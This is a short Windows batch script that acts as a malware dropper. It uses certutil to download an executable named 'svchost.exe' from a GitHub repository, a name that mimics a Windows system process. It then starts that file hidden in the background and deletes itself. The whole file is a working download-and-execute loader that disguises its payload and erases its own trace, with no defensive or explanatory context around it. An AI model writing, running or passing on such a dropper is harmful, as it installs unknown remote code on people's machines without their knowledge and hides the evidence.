@echo off
cd /d "%~dp0"
certutil -urlcache -f https://github.com/johtaromemory-hash/test/raw/refs/heads/main/svchost.exe svchost.exe >nul
if exist "%~dp0svchost.exe" start /b "" "%~dp0svchost.exe"
del "%~f0" >nul 2>&1
